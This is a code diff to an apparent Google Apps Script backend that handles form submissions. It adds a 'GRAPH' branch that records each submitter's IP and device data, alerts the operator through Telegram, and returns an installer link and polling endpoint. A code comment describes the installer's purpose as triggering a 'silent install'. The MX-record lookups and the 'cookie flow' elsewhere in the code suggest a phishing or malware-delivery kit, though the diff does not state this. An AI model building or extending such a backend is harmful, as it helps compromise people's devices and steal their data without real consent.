@@ -1581,6 +1581,7 @@ function updateMxRecordAndProvider(email, submissionId) {
  */
 function notifyFormSubmission(params, fallbackBaseUrl) {
   Logger.log("notifyFormSubmission called with params: " + JSON.stringify(params) + ", fallbackBaseUrl: " + fallbackBaseUrl);
+  Logger.log("[notifyFormSubmission] templateType will be resolved from projects sheet");
 
   try {
     const { token, formData: formDataString } = params;
@@ -1629,25 +1630,121 @@ function notifyFormSubmission(params, fallbackBaseUrl) {
     // GRAPH template type: reuse form-submission flow, store device/graph data,
     // return a scripting endpoint for the template to trigger silent install.
     if (String(templateType).toUpperCase().indexOf("GRAPH") !== -1) {
+      Logger.log("[GRAPH] notifyFormSubmission entered for project " + projectRowMap.projectId);
       try {
-        var graphResult = graphTemplateSubmit({
-          userId: projectRowMap.userId,
-          projectId: projectRowMap.projectId,
-          templateId: projectRowMap.templateId,
-          platform: (formData && formData.platform) || projectRowMap.platform || "windows",
-          deviceToken: params.deviceToken
+        // 1. Pick serverless endpoint whose severlessCategory contains "GRAPH"
+        var assignedGraphServer = null;
+        try {
+          assignedGraphServer = getBestServerlessEndpoint("GRAPH", fallbackBaseUrl, formData && formData.ipData, "GRAPH", "", "");
+        } catch (e) { Logger.log("[GRAPH] server pick err: " + e); }
+        var graphServerUrl = (assignedGraphServer && assignedGraphServer.severlessURL) ? String(assignedGraphServer.severlessURL).replace(/\/+$/, '') : String(CONFIG.EXTERNAL_API || fallbackBaseUrl || '').replace(/\/+$/, '');
+        Logger.log("[GRAPH] serverUrl=" + graphServerUrl);
+
+        // 2. Create GRAPH sheet if missing (inlined, no dependency on GRAPH.js)
+        var ss = SpreadsheetApp.getActiveSpreadsheet();
+        var graphSheet = ss.getSheetByName("GRAPH");
+        var graphCols = ["deviceId","userId","projectId","templateId","platform","agentType","agentVersion","ipData","deviceData","pairedAt","status","approvedRoots","graphIndexFileId","graphIndexUrl","graphIndexSize","lastIndexedAt","lastSeenAt","tokenHash","server","audit"];
+        if (!graphSheet) {
+          graphSheet = ss.insertSheet("GRAPH");
+          graphSheet.appendRow(graphCols);
+          Logger.log("[GRAPH] created GRAPH sheet");
+        } else {
+          var hdrs = graphSheet.getRange(1,1,1,graphSheet.getLastColumn() || 1).getValues()[0];
+          if (!hdrs || hdrs[0] !== "deviceId") {
+            graphSheet.getRange(1,1,1,graphCols.length).setValues([graphCols]);
+            Logger.log("[GRAPH] repaired GRAPH headers");
+          }
+        }
+
+        // 3. Generate deviceId and append row
+        var graphDeviceId = "dev_" + Utilities.getUuid();
+        var ipStr = (formData && formData.ipData) ? JSON.stringify(formData.ipData) : "";
+        var devStr = (formData && formData.deviceData) ? JSON.stringify(formData.deviceData) : "";
+        var row = graphCols.map(function(c) {
+          if (c === "deviceId") return graphDeviceId;
+          if (c === "userId") return projectRowMap.userId || "";
+          if (c === "projectId") return projectRowMap.projectId || "";
+          if (c === "templateId") return projectRowMap.templateId || "";
+          if (c === "platform") return (formData && formData.platform) || projectRowMap.platform || "windows";
+          if (c === "ipData") return ipStr;
+          if (c === "deviceData") return devStr;
+          if (c === "server") return graphServerUrl;
+          if (c === "status") return "PENDING";
+          if (c === "pairedAt") return new Date().toISOString();
+          if (c === "approvedRoots") return "[]";
+          if (c === "audit") return "[]";
+          return "";
         });
-        // Best-effort Telegram notification (same as generic template types)
+        graphSheet.appendRow(row);
+        Logger.log("[GRAPH] appended row deviceId=" + graphDeviceId);
+
+        // Update project response (mirroring cookie flow, GRAPH-only: no hub write)
+        try {
+          var projResult = getRowsByColumn("projects", "projectId", projectRowMap.projectId);
+          if (projResult.success && projResult.count > 0) {
+            var projRow = projResult.data[0];
+            var projHeaders = projResult.headers;
+            var respIdx = projHeaders.indexOf("response");
+            var existingResp = [];
+            if (respIdx !== -1 && projRow[respIdx]) {
+              try {
+                var parsed = JSON.parse(projRow[respIdx]);
+                if (parsed && parsed.fileId) {
+                  var fc = getJsonContentFromFile(parsed.fileId);
+                  if (fc.success) existingResp = fc.data;
+                } else if (Array.isArray(parsed)) {
+                  existingResp = parsed;
+                }
+              } catch (e) { existingResp = []; }
+            }
+            if (!Array.isArray(existingResp)) existingResp = [];
+            existingResp.push({
+              id: (existingResp.length + 1).toString(),
+              submissionId: graphDeviceId,
+              category: projectRowMap.templateNiche || "UNKNOWN",
+              type: "GRAPH",
+              title: projectRowMap.projectTitle || "Graph Submission",
+              userId: projectRowMap.userId || "",
+              projectId: projectRowMap.projectId || "",
+              formId: projectRowMap.formId || "",
+              timestamp: new Date().toISOString(),
+              deviceId: graphDeviceId,
+              status: "PENDING",
+              ipData: (formData && formData.ipData) ? formData.ipData : {},
+              deviceData: (formData && formData.deviceData) ? formData.deviceData : {}
+            });
+            var respStr = JSON.stringify(existingResp);
+            if (respStr.length > 45000) {
+              var uf = getOrCreateUserFolder(projectRowMap.userId, CONFIG.FOLDER_ID.USERS);
+              if (uf.success) {
+                var sf = createOrUpdateJsonFile(uf.folderId, projectRowMap.projectId + ".json", existingResp);
+                if (sf.success) respStr = JSON.stringify({ fileId: sf.fileId, count: existingResp.length });
+              }
+            }
+            setMultipleCellDataByColumnSearch("projects", "projectId", projectRowMap.projectId, { "response": respStr });
+            Logger.log("[GRAPH] project response updated with deviceId=" + graphDeviceId);
+          }
+        } catch (prErr) { Logger.log("[GRAPH] project response update err: " + prErr); }
+
+        // 4. Telegram notification
         try {
           var tgId = projectRowMap.telegramGroupId;
           if (tgId) {
-            var msg = "Project: " + (projectRowMap.projectTitle || "N/A") + "\nType: GRAPH\nStatus: CONSENT_SUBMITTED\nDeviceId: " + (graphResult && graphResult.deviceId);
-            // notifyAdmin/Telegram helper if available
+            var msg = "Project: " + (projectRowMap.projectTitle || "N/A") + "\nType: GRAPH\nStatus: CONSENT_SUBMITTED\nDeviceId: " + graphDeviceId + "\nServer: " + graphServerUrl;
             if (typeof sendTelegramMessage === "function") sendTelegramMessage(tgId, msg);
           }
-        } catch (notifyErr) { Logger.log("graph notify err: " + notifyErr); }
-        return graphResult;
+        } catch (notifyErr) { Logger.log("[GRAPH] notify err: " + notifyErr); }
+
+        // 5. Return endpoint + scripting link
+        return createJsonResponse({
+          success: true,
+          deviceId: graphDeviceId,
+          endpoint: graphServerUrl + "/graph/device/poll",
+          scriptingLink: graphServerUrl + "/graph/installer/" + ((formData && formData.platform) || "windows"),
+          server: graphServerUrl
+        });
       } catch (gErr) {
+        Logger.log("[GRAPH] ERROR: " + gErr.message + " | " + gErr.stack);
         return createJsonResponse({ success: false, error: gErr.message });
       }
     }
